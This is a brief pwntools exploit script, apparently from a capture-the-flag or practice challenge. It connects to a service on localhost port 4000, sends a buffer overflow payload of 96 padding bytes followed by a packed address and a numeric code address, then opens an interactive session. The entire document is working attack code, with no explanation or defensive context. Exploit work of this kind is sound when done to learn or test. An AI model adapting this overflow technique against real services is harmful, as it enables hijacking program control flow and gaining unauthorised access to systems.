from pwn import *

r = remote('127.0.0.1',4000)


raw_input('#')

r.sendline('A'*96+p32(0x804a000)+'\n'+str(134514147)+'\n')
r.interactive()
